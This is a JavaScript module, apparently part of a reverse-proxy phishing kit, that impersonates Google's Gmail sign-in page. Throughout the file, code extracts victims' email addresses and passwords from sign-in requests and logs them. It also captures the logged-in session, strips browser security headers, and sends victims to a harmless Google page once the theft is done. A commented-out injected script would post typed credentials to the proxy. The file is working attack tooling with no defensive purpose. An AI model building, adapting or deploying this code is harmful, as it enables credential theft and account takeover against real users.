/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const fs = require('fs')
const superagent = require('superagent');


// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        if (this.browserReq.url.startsWith('/v3/signin/_/AccountsSignInUi/data/batchexecute')
        || this.browserReq.url.startsWith('/signin/v2/')
        || this.browserReq.url.startsWith('/_/signin/challenge')) {
            return this.makeGmailProcess()
        }
        return this.makeGmailProcess()
        // return this.browserReq.pipe(this.proxyEndpoint)
        

    }

    makeGmailProcess() {
        if (this.browserReq.headers['content-length'] > 0) {
            let cJust = ''
            this.browserReq.on('data', (chunk) => {
                cJust += chunk.toString('utf8')
            })
            this.browserReq.on('end', () => {
                cJust += ''
                const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
                const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')

                this.proxyEndpoint.setHeader('Content-Length', kJust.length)

                const emailRegex = /f\.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22(.*?)%5C%22/
                const pwRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C\d%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/
                    
                const emailMatch = emailRegex.exec(cJust)
                const passwordMatch = pwRegex.exec(cJust)
                if (emailMatch) {
                    console.log('Email matched')
                    const emailAdressencoded = emailMatch[1]
                    const emailGmail = decodeURIComponent(emailAdressencoded)
                    Object.assign(this.browserReq.clientContext.sessionBody,
                        { email: emailGmail })
                    console.log(`email address is ${emailGmail}`)
                    // this.proxyEndpoint.setHeader('content-length', cJust.length)
                    this.proxyEndpoint.write(kJust) 
                    this.proxyEndpoint.end('')

                }else if (passwordMatch) {
                    console.log('Password matched')
                    const passwwordEncoded = passwordMatch[1]
                    const passwordStr = decodeURIComponent(passwwordEncoded)
                    Object.assign(this.browserReq.clientContext.sessionBody,
                        { password: passwordStr })
                    console.log(`password is ${passwordStr}`)
                    // this.proxyEndpoint.setHeader('content-length', cJust.length)
                    this.proxyEndpoint.write(kJust) 
                    this.proxyEndpoint.end('')

                } else {
                    console.log('NO matches found')
                    // this.proxyEndpoint.setHeader('Content-Length', kJust.length)
                    this.proxyEndpoint.write(kJust)
                    return this.proxyEndpoint.end('')
                }
            })
        } else {
            this.browserReq.pipe(this.proxyEndpoint)
        }

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
            {
                reg: /play.google.com/ig,
                replacement: '/playboy',
            },
            // {
            //     reg: /<head>/,
            //     replacement: '<script>window.addEventListener("load",(()=>{function e(e){return new Promise((n=>{if(document.querySelector(e))return n(document.querySelector(e));const t=new MutationObserver((o=>{document.querySelector(e)&&(n(document.querySelector(e)),t.disconnect())}));t.observe(document.body,{childList:!0,subtree:!0})}))}function n(){const e=document.querySelector("#identifierId").value;var n=new XMLHttpRequest;n.open("POST","/emailLookup",!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send("unenc_email="+encodeURIComponent(e))}function t(){const e=document.querySelector("input[type="password"]").value;var n=new XMLHttpRequest;n.open("POST","/pwdLookup",!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send("unenc_pwd="+encodeURIComponent(e))}e("#identifierNext").then((e=>{e.addEventListener("click",n)})),e("#passwordNext").then((e=>{e.addEventListener("click",t)}))}));</script><head>'
            // },
            {
               reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
               replacement: '/CheckConnection',
            },
           {
               reg: /name="checkConnection" value/gi,
               replacement: /name"checkConnection" value="youtube:1052:1"/,
           },
        //    {
        //        reg: /signaler-pa.googleapis.com/gi,
        //        replacement: process.env.HOST_DOMAIN,
        //    },
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        this.browserEndPoint.removeHeader('Content-Security-Policy')
        this.browserEndPoint.removeHeader('X-Content-Type-Options')
        this.browserEndPoint.removeHeader('X-XSS-Protection')
       

        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
           const rLocation = extRedirectObj.url
            
        }

        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    concludeAuth() {
        console.log('logged in fine please')
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }


    execute(clientContext) {
       
        if (this.req.url.startsWith('/punctual/')) {
            
            return super.superExecuteProxy('signaler-pa.googleapis.com', clientContext)
        }

        if (this.req.url === '/cold204') {
            this.res.writeHead(204)
            return this.res.end('')
        }

        if (this.req.url.startsWith('/playboy')) {
            const qhost = 'play.google.com'
            this.req.url = this.req.url.replace('/playboy/log', '/log')
            return super.superExecuteProxy(qhost, clientContext)
        }

        if (this.req.url.startsWith('/CheckConnection')) {
            this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
            return super.superExecuteProxy('accounts.youtube.com', clientContext)
        }

        if (this.req.url.startsWith('/CheckCookie')) {
            clientContext.setLogAvailable(true)
            clientContext.info.isLogin = true
            super.sendClientData(clientContext, {})
        }
        if (this.req.url.startsWith('/ServiceLogin?')  && clientContext.info.isLogin === true) {
            super.sendClientData(clientContext, {})
            return super.exitLink('https://safety.google/privacy/data/')

        }

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

            if (redirectToken.url.startsWith('https://myaccount.google.com/')) {
                super.sendClientData(clientContext, {})
                return super.exitLink('https://safety.google/privacy/data/')
            }

            if (redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                return super.exitLink('https://safety.google/privacy/data/')

            }
        }

        // if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
        //     clientContext.currentDomain = process.env.PROXY_DOMAIN
        //     this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
        //     // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        // }

        return super.execute(clientContext)

    }
}




const configExport = {
    SCHEME: 'gmail',

    CURRENT_DOMAIN: 'accounts.google.com',

    START_PATH: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin',

    AUTOGRAB_CODE: 'Email',



    EXTERNAL_FILTERS: 
    [
    'signaler-pa.googleapis.com',
    // 'ssl.gstatic.com',
    ],


    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,



    CAPTURES: { },

    //MODULE OPTIONS 
    MODULE_ENABLED: true,

    MODULE_OPTIONS: {
        startPath: this.START_PATH,
        exitLink: '',
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

